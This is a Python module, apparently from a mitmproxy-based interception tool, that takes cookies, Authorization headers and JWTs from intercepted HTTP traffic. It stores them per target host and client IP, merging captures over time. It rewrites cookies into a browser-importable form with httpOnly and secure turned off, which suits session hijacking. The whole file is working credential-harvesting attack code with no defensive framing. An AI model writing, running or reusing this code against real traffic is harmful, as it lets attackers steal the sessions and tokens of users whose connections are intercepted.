#!/usr/bin/env python3
"""
Token and authentication data extraction functionality.
"""

import json
from typing import Dict, List, Set
from mitmproxy import http

from config import EXTRACT_DIR, JWT_REGEX
from utils import get_client_ip, debug_log


class TokenExtractor:
    """Extracts and saves authentication tokens from HTTP traffic."""
    
    def extract_from_request(self, flow: http.HTTPFlow) -> None:
        """
        Extract tokens and cookies from HTTP request.
        
        Args:
            flow: HTTP flow object
        """
        host = flow.request.host
        client_ip = get_client_ip(flow)
        
        data: Dict = {}
        
        # Extract cookies
        cookies = flow.request.cookies.items()
        cookie_list = [
            {
                "domain": "." + host,
                "name": name,
                "value": value,
                "path": "/",
                "httpOnly": False,
                "secure": False
            } 
            for name, value in cookies
        ]
        
        if cookie_list:
            data["cookies"] = cookie_list
        
        # Extract authorization header
        auth = flow.request.headers.get("authorization", "")
        if auth:
            data["authorization"] = auth
            jwts = JWT_REGEX.findall(auth)
            if jwts:
                data["jwts"] = jwts
        
        # Extract JWTs from URL and body
        extra_jwts = JWT_REGEX.findall(flow.request.pretty_url + flow.request.text)
        if extra_jwts:
            data.setdefault("jwts", []).extend(extra_jwts)
        
        # Save if we found anything
        if data:
            self._save_token_data(host, client_ip, data)
    
    def _save_token_data(self, host: str, client_ip: str, data: Dict) -> None:
        """
        Save token data to JSON file.
        
        Args:
            host: Target host
            client_ip: Client IP address
            data: Token data dictionary
        """
        domain_dir = EXTRACT_DIR / host
        domain_dir.mkdir(parents=True, exist_ok=True)
        json_path = domain_dir / f"{client_ip}.json"
        
        try:
            # Load existing data
            if json_path.exists():
                with open(json_path) as f:
                    existing = json.load(f)
            else:
                existing = {}
            
            # Merge cookies (deduplicate by name)
            if "cookies" in data:
                old_cookies = {c["name"]: c for c in existing.get("cookies", [])}
                for c in data["cookies"]:
                    old_cookies[c["name"]] = c
                existing["cookies"] = list(old_cookies.values())
            
            # Update authorization
            if "authorization" in data:
                existing["authorization"] = data["authorization"]
            
            # Merge JWTs (deduplicate)
            if "jwts" in data:
                existing_jwts: Set[str] = set(existing.get("jwts", []))
                new_jwts: Set[str] = set(data["jwts"])
                existing["jwts"] = list(existing_jwts | new_jwts)
            
            # Atomic write
            temp_file = json_path.with_suffix('.tmp')
            with open(temp_file, "w") as f:
                json.dump(existing, f, indent=2)
            temp_file.replace(json_path)
            
        except Exception as e:
            debug_log(f"Error saving token data: {e}")
